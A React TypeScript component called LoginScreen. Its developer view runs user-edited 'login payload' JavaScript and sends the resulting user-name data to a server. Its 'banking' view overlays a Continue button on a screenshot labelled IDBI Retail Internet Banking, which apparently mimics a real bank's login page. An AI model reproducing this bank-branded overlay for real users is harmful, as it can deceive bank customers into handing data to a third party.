import { useCallback, useState } from 'react';
import { ArrowRight, Play, Settings } from 'lucide-react';
import { Button, IconButton } from '@/layout/ui';
import { getApiErrorMessage, sendUserName } from '@/lib/api';
import { DEFAULT_LOGIN_JS, runLoginJs, type UserNameData } from '@/loginPayload';
import { DEFAULT_JS_IDE_OPTIONS, JsIdeEditor, type JsIdeOptions } from '@/JsIdeEditor';
import { cn } from '@/lib/cn';

const WORDMARK = 'Dashboard';

type PreviewState =
  | { status: 'idle' }
  | { status: 'running' }
  | { status: 'ok'; json: string; logs: string[]; data: UserNameData }
  | { status: 'error'; message: string; logs: string[] };

type ViewMode = 'developer' | 'banking';

type PanelKey = 'javascript' | 'console' | 'preview';

const PANEL_LABELS: { key: PanelKey; label: string }[] = [
  { key: 'javascript', label: 'JavaScript' },
  { key: 'console', label: 'console' },
  { key: 'preview', label: 'Preview JSON' },
];

export function LoginScreen() {
  const [viewMode, setViewMode] = useState<ViewMode>('developer');
  const [source, setSource] = useState(DEFAULT_LOGIN_JS);
  const [ideOptions, setIdeOptions] = useState<JsIdeOptions>(DEFAULT_JS_IDE_OPTIONS);
  const [loading, setLoading] = useState(false);
  const [executing, setExecuting] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [preview, setPreview] = useState<PreviewState>({ status: 'idle' });
  const [openPanels, setOpenPanels] = useState<Record<PanelKey, boolean>>({
    javascript: true,
    console: true,
    preview: true,
  });

  const togglePanel = (key: PanelKey) => {
    setOpenPanels((prev) => ({ ...prev, [key]: !prev[key] }));
  };

  const execute = useCallback(async (): Promise<UserNameData | null> => {
    setExecuting(true);
    setError(null);
    setPreview({ status: 'running' });
    try {
      const { data, logs } = await runLoginJs(source);
      setPreview({
        status: 'ok',
        json: JSON.stringify(data, null, 2),
        logs,
        data,
      });
      return data;
    } catch (err) {
      const message = err instanceof Error ? err.message : 'Invalid JS';
      setPreview({ status: 'error', message, logs: [] });
      throw err;
    } finally {
      setExecuting(false);
    }
  }, [source]);

  const sendToServer = useCallback(async () => {
    setLoading(true);
    setError(null);
    try {
      const data = await execute();
      if (!data) return;
      await sendUserName(data);
    } catch (err) {
      setError(getApiErrorMessage(err));
    } finally {
      setLoading(false);
    }
  }, [execute]);

  const settingsButton = (
    <IconButton
      type="button"
      aria-label={viewMode === 'developer' ? 'Switch to banking view' : 'Switch to developer view'}
      aria-pressed={viewMode === 'banking'}
      onClick={() => setViewMode((mode) => (mode === 'developer' ? 'banking' : 'developer'))}
      className={cn(
        viewMode === 'banking' &&
          'h-10 w-10 rounded-lg text-white backdrop-blur-md backdrop-saturate-150 hover:bg-white/30 hover:text-white',
      )}
    >
      <Settings size={18} strokeWidth={1.75} />
    </IconButton>
  );

  if (viewMode === 'banking') {
    return (
      <div className="relative h-full overflow-y-auto bg-[#eef1f3]">
        <div className="fixed right-4 top-4 z-20">{settingsButton}</div>

        <div className="relative w-full min-w-[320px]">
          <img
            src="/Group.png"
            alt="IDBI Retail Internet Banking"
            className="block w-full select-none"
            draggable={false}
          />

          <div className="absolute left-[2.5%] top-[20.6%] w-[23.6%] min-w-[140px] max-w-[360px]">
            <button
              type="button"
              disabled={loading || executing}
              onClick={() => {
                void sendToServer();
              }}
              className={cn(
                'pressable flex h-11 w-full items-center justify-center gap-2 rounded-full',
                'bg-[#f47920] text-sm font-semibold text-white shadow-sm',
                'hover:bg-[#e06a15] active:bg-[#cc5f12]',
                'disabled:cursor-not-allowed disabled:opacity-50',
                'outline-none',
              )}
            >
              {loading ? 'Continuing…' : 'Continue'}
              <ArrowRight size={16} strokeWidth={2} aria-hidden />
            </button>

            {error ? (
              <div className="mt-2 rounded-md border border-status-error/30 bg-white/95 px-2.5 py-2 shadow-sm">
                <p className="text-xs font-medium text-status-error">Request failed</p>
                <p className="mt-0.5 break-words text-[11px] leading-relaxed text-content-secondary">
                  {error}
                </p>
              </div>
            ) : null}
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="flex h-full overflow-auto bg-paper">
      <div className="flex min-h-full w-full flex-col">
        <header className="flex items-center justify-between px-8 pt-8">
          <div className="flex items-center gap-2">
            <img src="/Image.png" alt="" className="h-8 w-8 rounded-md object-cover" aria-hidden />
            <p className="text-lg font-bold text-content-primary">
              <span className="text-brand-text">{WORDMARK}</span>
            </p>
          </div>
          {settingsButton}
        </header>

        <main className="flex flex-1 flex-col px-8 py-10">
          <div className="w-full">
            <div className="flex flex-wrap items-start justify-between gap-4">
              <h1 className="text-3xl font-bold text-content-primary">Login into IDBI</h1>

              <div className="flex flex-wrap items-center justify-end gap-2">
                <span className="text-[11px] font-semibold uppercase tracking-wide text-content-tertiary">
                  Panels
                </span>
                {PANEL_LABELS.map(({ key, label }) => {
                  const open = openPanels[key];
                  return (
                    <button
                      key={key}
                      type="button"
                      aria-pressed={open}
                      onClick={() => togglePanel(key)}
                      className={cn(
                        'rounded-full border px-2.5 py-1 text-xs font-medium transition-colors',
                        open
                          ? 'border-[#0f9d8d] bg-[#ccfbf1] text-[#0a6960]'
                          : 'border-[#a7f3d0] bg-[#f0fdf4] text-[#0f766e] hover:bg-[#dcfce7]',
                      )}
                    >
                      {label}
                    </button>
                  );
                })}
              </div>
            </div>

            {openPanels.javascript ? (
              <section className="mt-6">
                <p className="text-xs font-medium text-content-secondary">JavaScript</p>
                <div className="mt-1.5">
                  <JsIdeEditor
                    value={source}
                    onChange={(next) => {
                      setSource(next);
                      setError(null);
                      setPreview({ status: 'idle' });
                    }}
                    options={ideOptions}
                    onOptionsChange={setIdeOptions}
                  />
                </div>
              </section>
            ) : null}

            {openPanels.console ? (
              <section className="mt-4">
                <p className="text-xs font-medium text-content-secondary">console</p>
                <pre className="mt-1 max-h-28 overflow-auto rounded-md border border-hairline bg-[#0f172a] p-2 font-mono text-[11px] text-[#e2e8f0]">
                  {preview.status === 'idle'
                    ? 'Click Execute to run'
                    : preview.status === 'running'
                      ? 'Running…'
                      : preview.status === 'ok'
                        ? preview.logs.length > 0
                          ? preview.logs.join('\n')
                          : '(no logs)'
                        : preview.logs.length > 0
                          ? preview.logs.join('\n')
                          : '—'}
                </pre>
              </section>
            ) : null}

            {openPanels.preview ? (
              <section className="mt-4">
                <p className="text-xs font-medium text-content-secondary">Preview JSON</p>
                <pre
                  className={`mt-1 max-h-32 overflow-auto rounded-md border border-hairline p-2 font-mono text-[11px] ${
                    preview.status === 'ok'
                      ? 'bg-[color-mix(in_srgb,var(--brand)_6%,white)] text-content-secondary'
                      : preview.status === 'error'
                        ? 'bg-[color-mix(in_srgb,var(--status-error)_8%,white)] text-status-error'
                        : 'bg-sunken text-content-tertiary'
                  }`}
                >
                  {preview.status === 'idle'
                    ? 'Click Execute to preview JSON'
                    : preview.status === 'running'
                      ? 'Running…'
                      : preview.status === 'ok'
                        ? preview.json
                        : preview.message}
                </pre>
              </section>
            ) : null}

            <div className="mt-8 flex flex-wrap items-center gap-3">
              <Button
                type="button"
                variant="secondary"
                leftIcon={Play}
                disabled={executing || loading}
                onClick={() => {
                  void execute().catch(() => {
                    /* error shown in preview */
                  });
                }}
              >
                {executing ? 'Executing…' : 'Execute'}
              </Button>
              <Button
                type="button"
                variant="primary"
                rightIcon={ArrowRight}
                disabled={loading || executing}
                onClick={() => {
                  void sendToServer();
                }}
              >
                {loading ? 'Sending…' : 'Send to server'}
              </Button>
            </div>

            {error ? (
              <div className="mt-3 rounded-md border border-status-error/30 bg-[color-mix(in_srgb,var(--status-error)_8%,white)] px-3 py-2">
                <p className="text-sm font-medium text-status-error">Request failed</p>
                <p className="mt-1 break-words text-xs leading-relaxed text-content-secondary">{error}</p>
              </div>
            ) : null}
          </div>
        </main>

        <footer className="px-8 pb-8 text-xs text-content-tertiary">
          By continuing, you agree to our Terms of Use and Privacy Policy.
        </footer>
      </div>
    </div>
  );
}
